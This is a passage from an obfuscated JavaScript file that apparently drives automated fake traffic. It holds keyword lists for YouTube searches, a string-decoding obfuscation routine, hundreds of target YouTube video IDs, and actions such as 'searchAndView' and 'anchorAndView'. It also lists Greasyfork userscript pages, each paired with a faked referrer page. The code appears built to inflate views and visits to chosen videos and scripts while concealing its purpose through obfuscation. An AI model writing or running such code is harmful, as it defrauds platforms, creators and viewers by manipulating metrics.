't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x239a + -0x16ae + 0x3a52)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0xff1 + 0xd37 + 0xe8f * -0x2)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x2050 + -0x1214 + 0x3267);

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (-0x800 + -0x10c1 + -0x1 * -0x18c1);
    let h = e[f];
    if (c['HWoAlt'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x1d * -0xfe + 0x2d8 * -0xb + -0x282 * -0x1, r, s, t = -0x13f4 + 0x8bc + 0xb38; s = m['charAt'](t++); ~s && (r = q % (0x12e * 0x13 + 0x7 * 0x509 + 0x39a5 * -0x1) ? r * (-0x625 + -0x25af + -0xb6 * -0x3e) + s : s, q++ % (-0x8b4 + -0x15b * -0x10 + -0xcf8)) ? o += String['fromCharCode'](-0x8b * 0x13 + -0x1ca8 + 0x27f8 & r >> (-(0x2 * -0xdd3 + -0x100d + 0x2bb5) * q & -0x1f * 0x52 + 0x244b + 0x1a57 * -0x1)) : -0x2256 + 0x23f * 0xa + -0x17c * -0x8) {
          s = n['indexOf'](s);
        }
        for (let u = 0x13 * 0x17d + -0x1f02 + 0x2bb * 0x1, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0xd * -0x16d + 0x25e6 + -0x1b * 0xb7))['slice'](-(-0xe2c * -0x1 + -0xa47 + -0x3e3));
        }
        return decodeURIComponent(p);
      };
      c['zMwzrj'] = i, b = arguments, c['HWoAlt'] = !![];
    }
    const j = e[0x635 + 0x5 * 0x12 + -0x1 * 0x68f],
      k = f + j,
      l = b[k];
    return !l ? (h = c['zMwzrj'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    V(0xb) + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    W(0x3) + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    V(0x11) + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + V(0x18) + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + T(0x0, '8ofd'),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + W(0x10) + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + W(0x13) + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
